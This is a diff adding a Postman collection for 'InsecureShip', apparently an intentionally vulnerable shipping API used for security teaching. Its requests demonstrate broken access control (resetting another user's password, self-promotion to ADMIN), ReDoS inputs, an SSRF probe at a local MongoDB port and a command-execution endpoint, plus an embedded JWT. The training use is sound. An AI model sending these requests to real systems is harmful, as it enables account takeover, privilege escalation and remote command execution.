@@ -1,0 +1,207 @@
+{
+  "info": {
+    "name": "InsecureShip API",
+    "_postman_id": "insecureship-collection-id",
+    "description": "Colecci\u00f3n de vulnerabilidades educativas para InsecureShip.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "Auth - Login",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"username\": \"carlos\", \"password\": \"1234\"}"
+        },
+        "url": "{{base_url}}/api/auth/login"
+      },
+      "response": []
+    },
+    {
+      "name": "Users - Ver Todos los usuarios",
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "Authorization",
+            "value": "Bearer {{token}}"
+          }
+        ],
+        "url": "{{base_url}}/api/users/all"
+      },
+      "response": []
+    },
+    {
+      "name": "Users - Modificación de usuario",
+      "request": {
+        "method": "PUT",
+        "header": [
+          {
+            "key": "authorization",
+            "value": "Bearer {{token}}",
+            "type": "text"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"password\": \"hackeado\"}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": "{{base_url}}/api/users/maria"
+      },
+      "response": []
+    },
+    {
+      "name": "Users - Modificar Privilegios",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Authorization",
+            "value": "Bearer {{token}}"
+          },
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"username\": \"lucas\", \"role\": \"ADMIN\"}"
+        },
+        "url": "{{base_url}}/api/users/promote"
+      },
+      "response": []
+    },
+    {
+      "name": "Packages - Crear paquete",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Authorization",
+            "value": "Bearer {{token}}"
+          },
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"trackingNumber\": \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\", \"sender\": \"lucas\", \"recipient\": \"maria\", \"address\": \"123 Main Street\", \"status\": \"PENDING\"}"
+        },
+        "url": "{{base_url}}/api/packages/create"
+      },
+      "response": []
+    },
+    {
+      "name": "Packages - Search Tracking",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "authorization",
+            "value": "Bearer {{token}}",
+            "type": "text"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"pattern\": \"a+\"}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": "{{base_url}}/api/package/search-tracking"
+      },
+      "response": []
+    },
+    {
+      "name": "SSRF - Descargar imagen",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Authorization",
+            "value": "Bearer {{token}}"
+          },
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"imageUrl\": \"http://127.0.0.1:27017\"}"
+        },
+        "url": "{{base_url}}/api/images/fetch"
+      },
+      "response": []
+    },
+    {
+      "name": "RCE - Ejecutar comando",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Authorization",
+            "value": "Bearer {{token}}"
+          },
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"command\": \"ls\"}"
+        },
+        "url": "{{base_url}}/api/v0/utils/exec"
+      },
+      "response": []
+    }
+  ],
+  "event": [
+    {
+      "listen": "prerequest",
+      "script": {
+        "type": "text/javascript",
+        "packages": {},
+        "exec": [""]
+      }
+    },
+    {
+      "listen": "test",
+      "script": {
+        "type": "text/javascript",
+        "packages": {},
+        "exec": [""]
+      }
+    }
+  ],
+  "variable": [
+    {
+      "key": "token",
+      "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3ZmNiYjg2MDRmOWRmNGZhZDY5ZWU4YiIsInVzZXJuYW1lIjoiY2FybG9zIiwicm9sZSI6IkRJU1BBVENIRVIiLCJpYXQiOjE3NDQ2NDQzNzIsImV4cCI6MTc0NTI0OTE3Mn0._nijQ0RYXATVY7hG4Z-lmmlmBixRr3chBaK2nwWcmZY"
+    },
+    {
+      "key": "base_url",
+      "value": "http://localhost:3000",
+      "type": "default"
+    }
+  ]
+}
